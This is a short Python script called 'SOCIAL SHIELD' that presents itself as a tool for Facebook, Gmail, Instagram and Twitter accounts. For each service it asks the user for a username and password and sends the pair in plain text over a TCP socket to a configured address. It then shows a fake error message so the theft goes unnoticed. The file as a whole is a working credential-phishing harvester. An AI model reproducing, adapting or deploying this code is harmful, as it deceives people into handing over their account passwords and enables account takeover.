import socket
from datetime import datetime
import os
import sys

def logo():
     os.system("clear")
     print('''-------------------
SOCIAL SHIELD
-------------------
          ''')

def opt():
   print('''1. Facebook
2. Gmail
3. Instagram
4. Twitter
''')


def prog():
  try:
    choice = input("Option Number: ")
    print("")
    if choice == '1':
          fb_id = input("Facebook Name: ")
          if fb_id == "":
                   print("Enter a valid username!")
                   exit()
          fb_pass = input("Password: ")
          if fb_pass == "":
                   print("Password can't be empty")
                   exit()
          with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                                                            s.connect((ip, port))
                                                            s.send(f'Facebook_name: {fb_id} - Password: {fb_pass}'.encode('utf-8'))
          print("something went wrong! try again later.")

    elif choice == '2':
         print("")
         gmail = input("Email: ")
         if gmail == "":
                   print("Enter a valid email!")
                   exit()
         g_pass = input("Password: ")
         if g_pass == "":
                    print("Password can't be empty")
                    exit()
         with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s: 
                                                           s.connect((ip, port))
                                                           s.send(f'Email: {gmail} - Password: {g_pass}'.encode('utf-8'))
         print("something went wrong! try again later.")

    elif choice == '3':
         print("")
         insta = input("Instagram Name: ")
         if insta == "":
                   print("Enter a valid username!")
                   exit()
         insta_pass = input("Password: ")
         if insta_pass == "":
                        print("Password can't be empty")
                        exit()
         with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                                                           s.connect((ip, port))
                                                           s.send(f'insta_id: {insta} - Password: {insta_pass}'.encode('utf-8'))
         print("something went wrong! try again later.")

    elif choice == '4':
         print("")
         twit = input("Twitter Name: ")
         if twit == "":
                   print("Enter a valid username!")
                   exit()
         twit_pass = input("Password: ")
         if twit_pass == "":
                       print("Password can't be empty")
                       exit()
         with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                                                           s.connect((ip, port))
                                                           s.send(f'twit_id: {twit} - Password: {twit_pass}'.encode('utf-8'))
         print("something went wrong! try again later.")

    elif choice not in options:
         print("Invalid Option!")
         os.system('clear')
         logo()
         opt()
         prog()

  except ConnectionRefusedError:
          print("Server is down. try again later.")
  except KeyboardInterrupt:
          print("")
          print("Bye")


options = ['1', '2', '3', '4']
ip = '127.0.0.1'
port = 80
time = datetime.now()




logo()
opt()
prog()








